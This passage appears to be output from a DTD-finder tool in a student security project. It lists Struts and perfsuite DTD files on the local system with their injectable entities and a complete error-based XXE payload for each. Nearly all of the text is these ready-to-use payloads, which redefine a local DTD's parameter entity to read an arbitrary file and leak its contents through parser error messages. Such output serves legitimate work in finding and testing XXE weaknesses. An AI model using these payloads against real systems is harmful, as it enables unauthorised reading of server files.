        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_3.dtd`

**Injectable entity:** `RequestScope`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_3.dtd">

    <!ENTITY % RequestScope '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_2.dtd`

**Injectable entity:** `AttributeName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_2.dtd">

    <!ENTITY % AttributeName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_2.dtd`

**Injectable entity:** `BeanName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_2.dtd">

    <!ENTITY % BeanName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_2.dtd`

**Injectable entity:** `Boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_2.dtd">

    <!ENTITY % Boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_2.dtd`

**Injectable entity:** `ClassName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_2.dtd">

    <!ENTITY % ClassName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_2.dtd`

**Injectable entity:** `Integer`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_2.dtd">

    <!ENTITY % Integer '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_2.dtd`

**Injectable entity:** `Location`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_2.dtd">

    <!ENTITY % Location 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_2.dtd`

**Injectable entity:** `PropName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_2.dtd">

    <!ENTITY % PropName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_2.dtd`

**Injectable entity:** `RequestPath`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_2.dtd">

    <!ENTITY % RequestPath '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_2.dtd`

**Injectable entity:** `RequestScope`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_2.dtd">

    <!ENTITY % RequestScope '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_1.dtd`

**Injectable entity:** `AttributeName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_1.dtd">

    <!ENTITY % AttributeName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_1.dtd`

**Injectable entity:** `BeanName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_1.dtd">

    <!ENTITY % BeanName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_1.dtd`

**Injectable entity:** `Boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_1.dtd">

    <!ENTITY % Boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_1.dtd`

**Injectable entity:** `ClassName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_1.dtd">

    <!ENTITY % ClassName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_1.dtd`

**Injectable entity:** `Integer`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_1.dtd">

    <!ENTITY % Integer '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_1.dtd`

**Injectable entity:** `Location`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_1.dtd">

    <!ENTITY % Location 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_1.dtd`

**Injectable entity:** `PropName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_1.dtd">

    <!ENTITY % PropName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_1.dtd`

**Injectable entity:** `RequestPath`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_1.dtd">

    <!ENTITY % RequestPath '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_1.dtd`

**Injectable entity:** `RequestScope`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_1.dtd">

    <!ENTITY % RequestScope '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_4.dtd`

**Injectable entity:** `AttributeName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_4.dtd">

    <!ENTITY % AttributeName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_4.dtd`

**Injectable entity:** `BeanName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_4.dtd">

    <!ENTITY % BeanName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_4.dtd`

**Injectable entity:** `Boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_4.dtd">

    <!ENTITY % Boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_4.dtd`

**Injectable entity:** `ClassName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_4.dtd">

    <!ENTITY % ClassName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_4.dtd`

**Injectable entity:** `Integer`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_4.dtd">

    <!ENTITY % Integer '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_4.dtd`

**Injectable entity:** `Location`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_4.dtd">

    <!ENTITY % Location 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_4.dtd`

**Injectable entity:** `PropName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_4.dtd">

    <!ENTITY % PropName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_4.dtd`

**Injectable entity:** `RequestPath`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_4.dtd">

    <!ENTITY % RequestPath '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_4.dtd`

**Injectable entity:** `RequestScope`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_4.dtd">

    <!ENTITY % RequestScope '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_4.dtd`

**Injectable entity:** `PopulateStrategy`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_4.dtd">

    <!ENTITY % PopulateStrategy '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_0.dtd`

**Injectable entity:** `BeanName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_0.dtd">

    <!ENTITY % BeanName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_0.dtd`

**Injectable entity:** `Boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_0.dtd">

    <!ENTITY % Boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_0.dtd`

**Injectable entity:** `ClassName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_0.dtd">

    <!ENTITY % ClassName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_0.dtd`

**Injectable entity:** `Integer`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_0.dtd">

    <!ENTITY % Integer '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_0.dtd`

**Injectable entity:** `Location`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_0.dtd">

    <!ENTITY % Location 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_0.dtd`

**Injectable entity:** `PropName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_0.dtd">

    <!ENTITY % PropName '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_0.dtd`

**Injectable entity:** `RequestPath`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_0.dtd">

    <!ENTITY % RequestPath '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_0.dtd`

**Injectable entity:** `RequestScope`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/struts/struts-config_1_0.dtd">

    <!ENTITY % RequestScope '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/perfsuite/hwpcreport-0.3.dtd`

**Injectable entity:** `machineinfo.dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/perfsuite/hwpcreport-0.3.dtd">

    <!ENTITY % machineinfo.dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/perfsuite/hwpcprofilereport.dtd`

**Injectable entity:** `machineinfo.dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/perfsuite/hwpcprofilereport.dtd">

    <!ENTITY % machineinfo.dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
